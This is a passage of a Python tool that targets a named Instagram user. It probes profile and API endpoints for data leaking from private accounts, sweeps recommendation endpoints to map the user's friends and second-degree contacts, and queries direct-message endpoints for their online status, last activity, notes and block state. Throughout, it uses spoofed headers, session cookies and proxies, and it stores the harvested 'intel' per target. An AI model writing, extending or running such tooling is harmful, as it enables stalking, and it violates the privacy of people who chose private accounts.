    )
    return {
        'full_markers': full,
        'partial_markers': partial,
        'photo_urls': photo_urls,
        'avatar_urls': avatar_urls,
        'empty_timeline': empty_timeline,
        'real_hit': real_hit,
        'login_wall': bool(walls),
        'login_wall_hits': walls,
        'is_private_true': '"is_private":true' in text,
        'is_private_false': '"is_private":false' in text,
        'preloaders': preloaders,
        'leaking_preloaders': leaking_preloaders,
        'gated_preloaders': gated_preloaders,
    }


def save_artifact(username, label, content, ext):
    target_dir = os.path.join(ARTIFACT_ROOT, username)
    os.makedirs(target_dir, exist_ok=True)
    safe_label = re.sub(r'[^A-Za-z0-9_.-]+', '_', label)
    path = os.path.join(target_dir, f"{safe_label}.{ext}")
    mode = 'wb' if isinstance(content, bytes) else 'w'
    kwargs = {} if isinstance(content, bytes) else {'encoding': 'utf-8'}
    with open(path, mode, **kwargs) as f:
        f.write(content)
    return path


def fmt_signature(sig):
    return (f"HTTP {sig['status']} | {sig['bytes']:>7} B | "
            f"enc={sig['content-encoding']:<6} | nonce={sig['csp-nonce']:<10} | "
            f"x-fb-debug={sig['x-fb-debug']}")


def fmt_scan(scan):
    flags = []
    if scan['real_hit']:
        flags.append("HIT")
    if scan.get('leaking_preloaders'):
        flags.append(f"LEAK_PRELOADER={len(scan['leaking_preloaders'])}")
    if scan.get('gated_preloaders'):
        flags.append(f"gated_preloader={len(scan['gated_preloaders'])}")
    if scan['full_markers']:
        flags.append(f"full={scan['full_markers']}")
    if scan['partial_markers']:
        flags.append(f"partial={scan['partial_markers']}")
    if scan['photo_urls']:
        flags.append(f"feedURLs={scan['photo_urls']}")
    if scan['avatar_urls']:
        flags.append(f"avatar={scan['avatar_urls']}")
    if scan['empty_timeline']:
        flags.append("edges:[]")
    if scan['login_wall']:
        flags.append(f"wall={len(scan['login_wall_hits'])}")
    if scan['is_private_true']:
        flags.append("is_private:true")
    elif scan['is_private_false']:
        flags.append("is_private:false")
    return ', '.join(flags) if flags else 'no markers'


def probe_html(username, variant, suffix_label, suffix, cookies=None, save=False, proxies=None):
    url = f"https://www.instagram.com/{username}{suffix}"
    headers = build_headers(variant)
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies,
                     timeout=30, allow_redirects=True)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__{suffix_label}" + ('__auth' if cookies else '')
    if save:
        save_artifact(username, label, r.text, 'html')
        save_artifact(username, label + '__headers',
                      json.dumps(safe_response_headers(r.headers), indent=2),
                      'json')
    return {
        'kind': 'html',
        'url': url,
        'label': label,
        'sig': sig,
        'scan': scan,
        'response': r,
    }


def probe_api_web_profile_info(username, variant, cookies=None, save=False, proxies=None):
    url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers = build_headers(variant)
    headers.update({
        'x-ig-app-id': IG_WEB_APP_ID,
        'x-asbd-id': '129477',
        'x-requested-with': 'XMLHttpRequest',
        'accept': '*/*',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'referer': f"https://www.instagram.com/{username}/",
    })
    if cookies:
        headers['x-csrftoken'] = cookies['csrftoken']
    r = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, timeout=30)
    sig = response_signature(r)
    scan = scan_markers(r.text)
    label = f"{variant['name']}__api_web_profile_info" + ('__auth' if cookies else '')
    if save:
        save_artifact(username, label, r.text, 'json')
    return {
        'kind': 'api_web_profile_info',
        'url': url,
        'label': label,
        'sig': sig,
        'scan': scan,
        'response': r,
    }


                                                                      
                                                                        
                                                                        
                                                                        
                                        
                               
                                     
                                                                  
                                   
MODULE_HINT_SWEEP = (
    'profile',
    'feed_timeline',
    'feed_following',
    'mentions_module',
    'direct_thread',
    'recent_followers',
    'self_unified_follow_lists',
    'discover_people',
    'follow_chaining',
    'follow_request_log',
    'user_recommendation',
    'blended_user_search',
    'story_viewer_following_sheet',
    'story_viewer_recent_followers_sheet',
    'story_viewer_likers_sheet',
)

                                                                 
                                                                             
                                                                                
                                                                       
                                                   
                                                         
                                                                        
                                                
HIGH_VALUE_MODULES = (
    'profile',
    'direct_thread',
    'feed_following',
    'recent_followers',
    'story_viewer_following_sheet',
)


def run_module_hint_sweep(target_username, target_pk, cookies, save, proxies):
    """Phase 17: hits /api/v1/users/<pk>/info/ N times, each with a different
    `from_module=` value. Each call returns a chaining_results slice from a
    different recommendation-algorithm path. Aggregates the union — typically
    3-4× the unique accounts that the canonical call yields."""
    if not cookies or not target_pk:
        return [], None
    h = build_mobile_pigeon_headers(cookies)
    h['x-csrftoken'] = cookies['csrftoken']

    probes = []
    all_accounts = {}
    for mod in MODULE_HINT_SWEEP:
        url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
                f'?from_module={mod}&include_chaining=true')
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                              proxies=proxies, timeout=30, allow_redirects=False)
        except requests.exceptions.RequestException:
            continue
        text = r.text
        if r.status_code != 200 or len(text) < 5000:
            print(f"  [module={mod:<40}] HTTP {r.status_code} {len(r.content)}B (stub)")
            continue
        try:
            data = json.loads(text)
        except json.JSONDecodeError:
            continue
        chain = (data.get('user') or {}).get('chaining_results') or []
        new_in_this = 0
        for c in chain:
            un = c.get('username')
            if un and un not in all_accounts:
                all_accounts[un] = c
                new_in_this += 1
        if save:
            save_artifact(target_username, f'module_{mod}', text, 'json')
        plabel = f'module_{mod}'
        sig = response_signature(r)
        probes.append({
            'kind': f'module_hint_{mod}', 'url': url, 'label': plabel,
            'sig': sig, 'scan': scan_markers(text), 'response': r,
            'chaining_results': chain, 'new_in_this': new_in_this,
        })
        print(f"  [module={mod:<40}] HTTP {sig['status']} {sig['bytes']:>5}B "
              f"chain={len(chain)} new={new_in_this}")
        time.sleep(0.3)

                         
    if all_accounts:
        out_path = os.path.join(ARTIFACT_ROOT, target_username,
                                  'expanded_chaining_all_modules.json')
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w', encoding='utf-8') as f:
            json.dump(list(all_accounts.values()), f, indent=2, ensure_ascii=False)
        priv = sum(1 for a in all_accounts.values() if a.get('is_private'))
        ver = sum(1 for a in all_accounts.values() if a.get('is_verified'))
        print()
        print(f"  [+] EXPANDED CHAINING via module-hint sweep: "
              f"{len(all_accounts)} unique accounts "
              f"({priv} private, {ver} verified)")
        rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
        print(f"      saved -> {rel}")

    return probes, None


def run_reverse_chaining_sweep(target_username, target_pk, cookies, save,
                                proxies, modules=None, max_neighbors=None,
                                full=False):
    """Phase 18: 2. derece sosyal graf — Phase 17'nin bulduğu N komşunun her
    biri için chaining sweep koşar, target'ın pk'sini geriye doğru arar.

    Mantık: IG recommendation grafı simetri eğilimindedir; A'nın
    chaining_results'ında B varsa, B'nin chaining'inde A'nın geçmesi
    olağandır. 93 komşunun her birinde target'ı arayarak "STRONG MUTUAL"
    skoru çıkar. Aynı anda her komşunun chaining cevabını topluca union'a
    atarak 2. derece kümeyi (target'tan 2 hop) inşa et.

    Çıktı:
      strong_mutuals     -> evidence skor sıralı (target'ı işaret eden komşular)
      second_degree_cluster -> 2. derece tüm pk'ler frequency sıralı
                                (≥3 = high-confidence target arkadaş proxy)

    Bağımlılık: artifacts/<target>/expanded_chaining_all_modules.json
                (Phase 17 çıktısı). Yoksa erken dön.
    """
    if not cookies or not target_pk:
        return [], None
    chaining_path = os.path.join(ARTIFACT_ROOT, target_username,
                                  'expanded_chaining_all_modules.json')
    if not os.path.exists(chaining_path):
        print(f"  [-] Phase 17 çıktısı yok: {chaining_path}")
        print(f"      Önce Phase 17'yi koş (lean modda otomatik çalışır)")
        return [], None
    with open(chaining_path, encoding='utf-8') as f:
        neighbors = json.load(f)
    if max_neighbors:
        neighbors = neighbors[:max_neighbors]

    selected_modules = list(modules or (MODULE_HINT_SWEEP if full
                                          else HIGH_VALUE_MODULES))
    h = build_mobile_pigeon_headers(cookies)
    h['x-csrftoken'] = cookies['csrftoken']

    strong_mutuals = {}                                   
    second_degree = {}                                            
    target_pk_str = str(target_pk)
    total_req = len(neighbors) * len(selected_modules)
    est_min = total_req * 0.4 / 60

    print(f"  [*] {len(neighbors)} komşu × {len(selected_modules)} modül "
          f"= {total_req} request (~{est_min:.1f} dk @ 0.4s)")
    print(f"  [*] target_pk={target_pk_str} (geriye doğru aranacak)")
    print(f"  [*] modules: {selected_modules}")

    for idx, neighbor in enumerate(neighbors, 1):
        nb_pk = str(neighbor.get('pk') or neighbor.get('id') or '')
        nb_un = neighbor.get('username') or '?'
        if not nb_pk:
            continue

        nb_evidence = 0
        nb_modules_hit = []
        nb_chain_unique_pks = set()

        for mod in selected_modules:
            url = (f'https://i.instagram.com/api/v1/users/{nb_pk}/info/'
                    f'?from_module={mod}&include_chaining=true')
            try:
                r = requests.get(url, headers=h, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=False)
            except requests.exceptions.RequestException:
                time.sleep(0.4)
                continue
            if r.status_code != 200 or len(r.content) < 5000:
                time.sleep(0.4)
                continue
            try:
                data = json.loads(r.text)
            except json.JSONDecodeError:
                time.sleep(0.4)
                continue
            chain = (data.get('user') or {}).get('chaining_results') or []

                                                                 
            target_in_chain = any(str(c.get('pk')) == target_pk_str
                                   for c in chain)
            if target_in_chain:
                nb_evidence += 1
                nb_modules_hit.append(mod)

                                                                               
            for c in chain:
                cpk = str(c.get('pk') or '')
                if not cpk or cpk == target_pk_str:
                    continue
                nb_chain_unique_pks.add(cpk)
                if cpk not in second_degree:
                    second_degree[cpk] = {
                        'frequency': 0,
                        'pointing_neighbors': [],
                        'username': c.get('username'),
                        'full_name': c.get('full_name'),
                        'is_private': c.get('is_private'),
                        'is_verified': c.get('is_verified'),
                    }
                second_degree[cpk]['frequency'] += 1
                if nb_pk not in second_degree[cpk]['pointing_neighbors']:
                    second_degree[cpk]['pointing_neighbors'].append(nb_pk)

            time.sleep(0.4)

        marker = ''
        if nb_evidence >= 1:
            strong_mutuals[nb_pk] = {
                'evidence_count': nb_evidence,
                'modules': nb_modules_hit,
                'username': nb_un,
                'full_name': neighbor.get('full_name'),
                'is_private': neighbor.get('is_private'),
                'is_verified': neighbor.get('is_verified'),
                'chain_unique_count': len(nb_chain_unique_pks),
            }
            marker = f' *** STRONG MUTUAL evidence={nb_evidence}/{len(selected_modules)}'
        un_safe = nb_un.encode('ascii', errors='replace').decode('ascii')
        print(f"  [{idx:>3}/{len(neighbors)}] @{un_safe:<22} "
              f"chain_uniq={len(nb_chain_unique_pks):>3}{marker}")

                                           
    sorted_2nd = dict(sorted(second_degree.items(),
                              key=lambda kv: -kv[1]['frequency']))
    sorted_mut = dict(sorted(strong_mutuals.items(),
                              key=lambda kv: -kv[1]['evidence_count']))

    out = {
        'target_pk': target_pk_str,
        'target_username': target_username,
        'neighbors_probed': len(neighbors),
        'modules_per_neighbor': selected_modules,
        'requests_total': total_req,
        'strong_mutuals': sorted_mut,
        'strong_mutuals_count': len(sorted_mut),
        'second_degree_cluster': sorted_2nd,
        'second_degree_total': len(sorted_2nd),
    }
    out_path = os.path.join(ARTIFACT_ROOT, target_username,
                              'reverse_chaining.json')
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w', encoding='utf-8') as f:
        json.dump(out, f, indent=2, ensure_ascii=False)

          
    high_freq = [(pk, v) for pk, v in sorted_2nd.items() if v['frequency'] >= 3]
    print()
    print(f"  [+] STRONG MUTUALS (target geri-referansı): "
          f"{len(sorted_mut)} komşu")
    for pk, v in list(sorted_mut.items())[:10]:
        un_safe = (v['username'] or '?').encode('ascii',
                                                  errors='replace').decode('ascii')
        priv = ' [PRIVATE]' if v.get('is_private') else ''
        ver = ' [VERIFIED]' if v.get('is_verified') else ''
        print(f"      pk={pk:<14} @{un_safe:<22} "
              f"evidence={v['evidence_count']}/{len(selected_modules)} "
              f"modules={v['modules']}{priv}{ver}")
    print()
    print(f"  [+] 2. DERECE CLUSTER: {len(sorted_2nd)} unique pk")
    print(f"      ≥3 komşuda geçen (high-confidence target arkadaş proxy): "
          f"{len(high_freq)}")
    for pk, v in high_freq[:15]:
        un_safe = (v['username'] or '?').encode('ascii',
                                                  errors='replace').decode('ascii')
        priv = ' [PRIVATE]' if v.get('is_private') else ''
        ver = ' [VERIFIED]' if v.get('is_verified') else ''
        print(f"      pk={pk:<14} @{un_safe:<22} freq={v['frequency']:>2} "
              f"via {len(v['pointing_neighbors'])} komşu{priv}{ver}")

    rel = os.path.relpath(out_path, os.path.dirname(os.path.abspath(__file__)))
    print(f"  saved -> {rel}")
    return [], None


                                                                                   
                                                                                  
                                                                                 
                                                              
                                                                                 
                                                                                      
                                                                                     
                                                                             
                                                                        
                                                          
                                                                             
                                                            
 
                                                                                    

                                       
                                                                            
                                                                             
                                        
                                                                               
                                                                           
                                   
                                                                        
                                              
                                                                       
                              
                                                              
 
                                                                        
                                                                      
DM_PRECHECK_ENDPOINTS = [
                                                                      
    ('GET',  '/api/v1/direct_v2/threads/get_by_participants/'
              '?recipient_users=%5B{pk}%5D',
     None, 'threads_get_by_participants', 'thread', 'pigeon'),

                                                                               
    ('GET',  '/api/v1/direct_v2/threads/get_thread_lookup/'
              '?recipient_user_ids=%5B{pk}%5D',
     None, 'thread_lookup', 'thread', 'pigeon'),

                     
    ('GET',  '/api/v1/direct_v2/inbox/?folder=&limit=20'
              '&thread_message_limit=1&persistentBadging=true',
     None, 'inbox_primary', 'inbox', 'web'),
                                                     
    ('GET',  '/api/v1/direct_v2/inbox/?folder=pending&limit=20'
              '&thread_message_limit=1',
     None, 'inbox_pending', 'inbox', 'web'),

                                                          
    ('POST', '/api/v1/notes/get_notes/',
     'peer_user_ids=%5B{pk}%5D', 'notes_get_notes', 'notes', 'web'),
    ('GET',  '/api/v1/notes/get_user_notes/?user_id={pk}',
     None, 'notes_get_user_notes', 'notes', 'web'),

                                                                   
    ('GET',  '/api/v1/friendships/show/{pk}/',
     None, 'friendship_show', 'block', 'web'),
    ('POST', '/api/v1/friendships/show_many/',
     'user_ids={pk}', 'friendship_show_many', 'block', 'web'),

                                                                            
    ('GET',  '/api/v1/users/{pk}/info/?include_reel=true&include_chaining=true'
              '&include_live_status=true&from_module=direct_thread',
     None, 'info_via_dm_module', 'eligibility', 'web'),
]


def _iso_ms(ms):
    """ms epoch -> ISO string (None safe)."""
    if not isinstance(ms, (int, float)) or ms <= 0:
        return None
    try:
        import datetime
                                                                          
        secs = ms / 1000.0 if ms > 1e12 else ms / 1.0
        if secs > 1e11:                              
            secs = ms / 1e6
        return datetime.datetime.fromtimestamp(
            secs, tz=datetime.timezone.utc).isoformat()
    except (ValueError, OSError, OverflowError):
        return None


def parse_dm_precheck_response(label, text, target_pk):
    """Endpoint label'ına göre intel field çıkarımı. None döndürürse hiçbir
    privacy-relevant alan yoktu / parse fail."""
    try:
        d = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return None
    if not isinstance(d, dict):
        return None
    target_pk_str = str(target_pk)
    out = {}

    if label in ('get_presence', 'presence_active_now'):
                                                                          
                                                                    
        up = d.get('user_presence') or {}
        for pk, info in up.items():
            if not isinstance(info, dict):
                continue
            entry = {
                'pk': str(pk),
                'is_active': info.get('is_active'),
                'last_activity_at_ms': info.get('last_activity_at_ms'),
                'last_activity_iso': _iso_ms(info.get('last_activity_at_ms')),
                'in_threads_app': info.get('in_threads_app'),
                'is_active_chat_visual_thread':
                    info.get('is_active_chat_visual_thread'),
                'last_seen_at_ms': info.get('last_seen_at_ms'),
                'last_seen_iso': _iso_ms(info.get('last_seen_at_ms')),
            }
            out.setdefault('presence_entries', []).append(entry)
            if str(pk) == target_pk_str:
                out['target_presence'] = entry
                                           
        out.setdefault('subscriptions_status', d.get('subscriptions_status'))

    elif label == 'threads_get_by_participants':
                                                                           
        users = d.get('users') or []
        target_user = next((u for u in users
                             if str(u.get('pk') or '') == target_pk_str), {})
        out['thread_context_items'] = d.get('thread_context_items')
        out['reachability_statuses'] = d.get('reachability_statuses')
        out['is_viewer_unconnected'] = d.get('is_viewer_unconnected')
        out['is_appointment_booking_enabled'] = d.get(
            'is_appointment_booking_enabled')
        out['has_reached_message_request_limit'] = d.get(
            'has_reached_message_request_limit')
        out['should_show_safety_card'] = d.get('should_show_safety_card')
        out['responsiveness_category'] = d.get('responsiveness_category')
        out['lightweight_intervention_appealable_entity_id'] = d.get(
            'lightweight_intervention_appealable_entity_id')
        out['target_user_meta'] = {
            'date_joined_ts': target_user.get('date_joined'),
            'date_joined_iso': _iso_ms(
                (target_user.get('date_joined') or 0) * 1000)
                if target_user.get('date_joined') else None,
            'follower_count': target_user.get('follower_count'),
            'following_count': target_user.get('following_count'),
            'media_count': target_user.get('media_count'),
            'mutual_followers_count': target_user.get('mutual_followers_count'),
            'is_creator_agent_enabled': target_user.get(
                'is_creator_agent_enabled'),
            'pinned_channels_info': target_user.get('pinned_channels_info'),
            'interop_messaging_user_fbid': target_user.get(
                'interop_messaging_user_fbid'),
        }
                                                                
        thread = d.get('thread') or {}
        if thread:
            out['existing_thread'] = {
                'thread_id': thread.get('thread_id'),
                'thread_v2_id': thread.get('thread_v2_id'),
                'last_activity_at': thread.get('last_activity_at'),
                'last_activity_iso': _iso_ms(thread.get('last_activity_at')),
                'last_seen_at': thread.get('last_seen_at'),
                'is_pin': thread.get('is_pin'),
                'muted': thread.get('muted'),
                'pending': thread.get('pending'),
                'shh_mode_enabled': thread.get('shh_mode_enabled'),
            }

    elif label in ('notes_get_notes', 'notes_get_user_notes'):
                                                                    
                                         
                                                                 
        items = (d.get('items')
                  or (d.get('notes_response') or {}).get('items')
                  or d.get('notes')
                  or [])
        target_notes = []
        for n in items:
            uid = str(n.get('user_id')
                       or (n.get('user') or {}).get('pk')
                       or (n.get('user') or {}).get('id') or '')
            if uid == target_pk_str:
                target_notes.append(n)
                                                                       
                                                              
        if not target_notes and items and label == 'notes_get_user_notes':
            target_notes = items
        out['target_has_active_note'] = bool(target_notes)
        out['note_items_count'] = len(items)
        out['target_notes'] = []
        for n in target_notes:
            out['target_notes'].append({
                'id': n.get('id'),
                'text': n.get('text'),
                'audience': n.get('audience'),
                'created_at': n.get('created_at'),
                'created_at_iso': _iso_ms((n.get('created_at') or 0) * 1000)
                                    if n.get('created_at') else None,
                'expires_at': n.get('expires_at'),
                'expires_at_iso': _iso_ms((n.get('expires_at') or 0) * 1000)
                                    if n.get('expires_at') else None,
                'is_emoji_only': n.get('is_emoji_only'),
                'has_translation': n.get('has_translation'),
                'serialized_reply_message': n.get('serialized_reply_message'),
            })

    elif label == 'thread_lookup':
                                                                      
                                                                        
        out['thread_lookup_keys'] = sorted(d.keys())
        thread = d.get('thread') or {}
        thread_id_lookup = (d.get('thread_id_lookup') or {})
        if thread:
            out['existing_thread'] = {
                'thread_id': thread.get('thread_id'),
                'thread_v2_id': thread.get('thread_v2_id'),
                'last_activity_at': thread.get('last_activity_at'),
                'last_activity_iso': _iso_ms(thread.get('last_activity_at')),
                'is_pin': thread.get('is_pin'),
                'pending': thread.get('pending'),
                'muted': thread.get('muted'),
            }
        if thread_id_lookup:
            out['thread_id_lookup'] = thread_id_lookup
            out['has_thread'] = bool(thread_id_lookup)

    elif label == 'friendship_show':
                                                               
        out['friendship_state'] = {k: d.get(k) for k in (
            'following', 'followed_by', 'blocking', 'is_private',
            'is_restricted', 'incoming_request', 'outgoing_request',
            'is_bestie', 'is_feed_favorite', 'muting',
            'is_muting_reel', 'is_muting_notes',
            'is_blocking_reel', 'subscribed', 'is_eligible_to_subscribe',
        ) if k in d}

    elif label == 'friendship_show_many':
        fs = d.get('friendship_statuses') or {}
        if fs and isinstance(fs, dict):
            out['friendship_statuses'] = fs
            tinfo = fs.get(target_pk_str) or (
                list(fs.values())[0] if fs else {})
            out['target_status'] = tinfo

    elif label == 'inbox_primary':
        inbox = d.get('inbox') or {}
        threads = inbox.get('threads') or []
        target_threads = []
        for t in threads:
            users = t.get('users') or []
            user_pks = [str(u.get('pk') or u.get('pk_id') or '') for u in users]
            if target_pk_str in user_pks:
                target_threads.append({
                    'thread_id': t.get('thread_id'),
                    'thread_v2_id': t.get('thread_v2_id'),
                    'last_activity_at': t.get('last_activity_at'),
                    'last_activity_iso': _iso_ms(t.get('last_activity_at')),
                    'last_seen_at': t.get('last_seen_at'),
                    'is_pin': t.get('is_pin'),
                    'muted': t.get('muted'),
                    'thread_type': t.get('thread_type'),
                    'last_permanent_item_ts': (t.get('last_permanent_item') or {})
                                                .get('timestamp'),
                })
        out['inbox_total_threads'] = len(threads)
        out['inbox_unseen_count'] = inbox.get('unseen_count')
        out['has_thread_with_target'] = bool(target_threads)
        if target_threads:
            out['target_thread_metadata'] = target_threads

    elif label == 'inbox_pending':
        inbox = d.get('inbox') or {}
        threads = inbox.get('threads') or []
        out['pending_thread_count'] = len(threads)
        out['pending_unseen_count'] = inbox.get('unseen_count')
                                                                     
        for t in threads:
            users = t.get('users') or []
            user_pks = [str(u.get('pk') or '') for u in users]
            if target_pk_str in user_pks:
                out['target_in_pending'] = {
                    'thread_id': t.get('thread_id'),
                    'last_activity_iso': _iso_ms(t.get('last_activity_at')),
                }

    elif label == 'info_via_dm_module':
                                                                
        u = d.get('user') or {}
        out['info_via_dm'] = {
            'reel_auto_archive': u.get('reel_auto_archive'),
            'allowed_commenter_type': u.get('allowed_commenter_type'),
            'has_unseen_besties_media': u.get('has_unseen_besties_media'),
            'remove_message_enabled': u.get('remove_message_enabled'),
            'show_account_transparency_details':
                u.get('show_account_transparency_details'),
            'live_subscription_status': u.get('live_subscription_status'),
            'broadcast_chat_preference': u.get('broadcast_chat_preference'),
            'mutual_followers_count': u.get('mutual_followers_count'),
            'social_context': u.get('social_context'),
            'profile_context': u.get('profile_context'),
            'profile_context_facepile_users':
                u.get('profile_context_facepile_users'),
            'profile_context_links_with_user_ids':
                u.get('profile_context_links_with_user_ids'),
            'follow_friction_type': u.get('follow_friction_type'),
            'fbid_v2': str(u.get('fbid_v2') or '') or None,
        }

    return out or None


def build_dm_web_headers(cookies, target_username, content_type=None):
    """Web XHR header set — IG'nin /direct/inbox/ sayfasındayken attığı
    XHR'lara karşılık gelir. probe_api_web_profile_info'daki şablonun aynısı +
    DM endpointlerine özel x-csrftoken/origin gerekleri.

    Mobile pigeon header set ile DENENDI: i.instagram.com 400 "Prompt has
    contribution" (signed_body integrity check) veya 404 (login wall HTML)
    döndü. Web sessionid'si web header set'iyle www host'unda kabul ediliyor.
    """
    v = next((x for x in HEADER_VARIANTS if not x.get('mobile')),
              HEADER_VARIANTS[0])
    h = build_headers(v)
    h.update({
        'x-ig-app-id':       IG_WEB_APP_ID,
        'x-asbd-id':         '129477',
        'x-requested-with':  'XMLHttpRequest',
        'accept':            '*/*',
        'sec-fetch-dest':    'empty',
        'sec-fetch-mode':    'cors',
        'sec-fetch-site':    'same-origin',
        'origin':            'https://www.instagram.com',
        'referer':           f'https://www.instagram.com/direct/new/',
    })
    if cookies and cookies.get('csrftoken'):
        h['x-csrftoken'] = cookies['csrftoken']
    if content_type:
        h['content-type'] = content_type
                                                                                
    h.pop('upgrade-insecure-requests', None)
    h.pop('sec-fetch-user', None)
    return h


def run_dm_precheck(target_username, target_pk, cookies, save, proxies):
    """Phase 19: direct_v2 namespace altında reachability/presence/block/thread/
    eligibility endpointlerini sırayla vur, her birinden privacy-relevant
    field'ı çıkar, aggregated JSON yaz.

    v2 değişikliği: i.instagram.com + mobile pigeon yerine www.instagram.com
    + web XHR header set. (v1'de 9 endpoint 404 login-wall HTML, 6 endpoint
    400 "Prompt has contribution" döndü — pigeon UA + web sessionid mismatch.)

    En değerli sızıntılar:
      - last_activity_at_ms      (target en son ne zaman online)
      - is_active                (şu an online mı)
      - friendship.blocking      (sen target'ı blokladın mı)
      - has_thread_with_target   (aranızda DM thread var mı + ts)
      - target_has_active_note   (target'ın aktif notes'u var mı + audience)
    """
    if not cookies or not target_pk:
        return [], None

    viewer_pk = (cookies or {}).get('ds_user_id', '')

    aggregated = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'viewer_pk': viewer_pk,
        'endpoints_probed': [],
        'intel': {
            'presence': {},
            'block': {},
            'thread': {},
            'inbox': {},
            'notes': {},
            'eligibility': {},
        },
    }
    probes = []

    print(f"  [*] {len(DM_PRECHECK_ENDPOINTS)} DM endpoint "
          f"(per-endpoint header strategy: web XHR | mobile pigeon)")
    print(f"  [*] viewer_pk={viewer_pk} -> target_pk={target_pk}")

    for entry in DM_PRECHECK_ENDPOINTS:
                                                                          
        if len(entry) == 6:
            method, path_tpl, body_tpl, label, intel_key, hdr_strategy = entry
        else:
            method, path_tpl, body_tpl, label, intel_key = entry
            hdr_strategy = 'web'
        path = path_tpl.format(pk=target_pk)
        url = f'https://www.instagram.com{path}'
        body = body_tpl.format(pk=target_pk) if body_tpl is not None else None
        ct = ('application/x-www-form-urlencoded'
               if method == 'POST' else None)
        if hdr_strategy == 'pigeon':
                                                                            
                                                            
            h = build_mobile_pigeon_headers(cookies)
            h['x-csrftoken'] = cookies['csrftoken']
            if ct:
                h['content-type'] = ct
        else:
            h = build_dm_web_headers(cookies, target_username, content_type=ct)
        try:
            if method == 'POST':
                r = requests.post(url, headers=h, cookies=cookies, data=body,
                                   proxies=proxies, timeout=30,
                                   allow_redirects=False)
            else:
                r = requests.get(url, headers=h, cookies=cookies,
                                  proxies=proxies, timeout=30,
                                  allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"  [{method:<4}] {label:<32} EXC {type(e).__name__}")
            time.sleep(0.4)
            continue

        sig = response_signature(r)
        intel = None
        if r.status_code == 200 and r.text.strip().startswith('{'):
            intel = parse_dm_precheck_response(label, r.text, target_pk)
        plabel = f'dm_precheck__{label}'
        if save:
            ext = 'json' if (r.text.strip().startswith('{') or
                              r.text.strip().startswith('[')) else 'html'
            save_artifact(target_username, plabel, r.text, ext)

        flag = ''
        if intel:
            if 'target_presence' in intel:
                tp = intel['target_presence']
                flag = (f" *** is_active={tp.get('is_active')} "
                        f"last={tp.get('last_activity_iso') or '-'}")
            elif intel.get('friendship_state'):
                fs = intel['friendship_state']
                flag = (f" *** following={fs.get('following')} "
                        f"followed_by={fs.get('followed_by')} "
                        f"blocking={fs.get('blocking')} "
                        f"is_restricted={fs.get('is_restricted')}")
            elif intel.get('target_status'):
                ts = intel['target_status']
                flag = (f" *** following={ts.get('following')} "
                        f"followed_by={ts.get('followed_by')}")
            elif intel.get('has_thread_with_target'):
                flag = " *** thread_exists=True"
            elif intel.get('target_in_pending'):
                flag = " *** target_in_pending=True"
            elif intel.get('target_has_active_note'):
                flag = f" *** active_note={len(intel.get('target_notes') or [])}"
            elif intel.get('reachability_statuses'):
                flag = (f" *** reachability="
                        f"{intel['reachability_statuses']} "
                        f"unconnected={intel.get('is_viewer_unconnected')}")
            elif intel.get('info_via_dm'):
                idv = intel['info_via_dm']
                flag = (f" mutuals={idv.get('mutual_followers_count')} "
                        f"friction={idv.get('follow_friction_type')}")
            else:
                flag = f" intel_keys={list(intel.keys())[:3]}"

        print(f"  [{method:<4}] {label:<32} HTTP {sig['status']:<3} "
              f"{sig['bytes']:>5}B{flag}")

        if intel:
            target_bucket = aggregated['intel'].setdefault(intel_key, {})
            target_bucket[label] = intel
        aggregated['endpoints_probed'].append({
            'label': label, 'method': method, 'path': path,
            'status': sig['status'], 'bytes': sig['bytes'],
            'has_intel': bool(intel),
        })
        probes.append({
            'kind': f'dm_precheck_{label}',
            'url': url, 'label': plabel, 'sig': sig,
            'scan': scan_markers(r.text), 'response': r,
            'dm_intel': intel,
        })
        time.sleep(0.4)

                                                                        
    summary = {}
    pres = aggregated['intel'].get('presence', {})
    presence_target = ((pres.get('get_presence') or {}).get('target_presence')
                        or (pres.get('presence_active_now') or {})
                            .get('target_presence'))
    if presence_target:
        summary['target_is_active_now'] = presence_target.get('is_active')
        summary['target_last_activity_iso'] = presence_target.get(
            'last_activity_iso')
        summary['target_in_threads_app'] = presence_target.get('in_threads_app')

    blk = aggregated['intel'].get('block', {}).get('friendship_show', {})
    if blk and blk.get('friendship_state'):
        fs = blk['friendship_state']
        summary['viewer_following_target'] = fs.get('following')
        summary['target_following_viewer'] = fs.get('followed_by')
        summary['viewer_blocking_target'] = fs.get('blocking')
        summary['viewer_muting_target'] = fs.get('muting')
        summary['target_is_restricted'] = fs.get('is_restricted')
        summary['outgoing_request'] = fs.get('outgoing_request')
        summary['incoming_request'] = fs.get('incoming_request')
        summary['is_bestie'] = fs.get('is_bestie')

    thread_ctx = aggregated['intel'].get('thread', {}).get(
        'threads_get_by_participants', {})
    if thread_ctx:
        summary['reachability_status'] = thread_ctx.get('reachability_statuses')
        summary['is_viewer_unconnected'] = thread_ctx.get('is_viewer_unconnected')
        summary['responsiveness_category'] = thread_ctx.get(
            'responsiveness_category')
        summary['has_reached_msg_request_limit'] = thread_ctx.get(
            'has_reached_message_request_limit')
        if thread_ctx.get('existing_thread'):
            summary['existing_thread'] = thread_ctx['existing_thread']

    inbox_primary = aggregated['intel'].get('inbox', {}).get('inbox_primary',
                                                               {})
    if inbox_primary:
        summary['has_thread_in_inbox'] = inbox_primary.get(
            'has_thread_with_target')
        summary['inbox_total_threads'] = inbox_primary.get(
            'inbox_total_threads')
        if inbox_primary.get('target_thread_metadata'):
            summary['thread_meta'] = inbox_primary['target_thread_metadata'][0]

    inbox_pending = aggregated['intel'].get('inbox', {}).get('inbox_pending',
                                                               {})
    if inbox_pending:
        summary['target_in_pending_inbox'] = bool(
            inbox_pending.get('target_in_pending'))
        if inbox_pending.get('target_in_pending'):
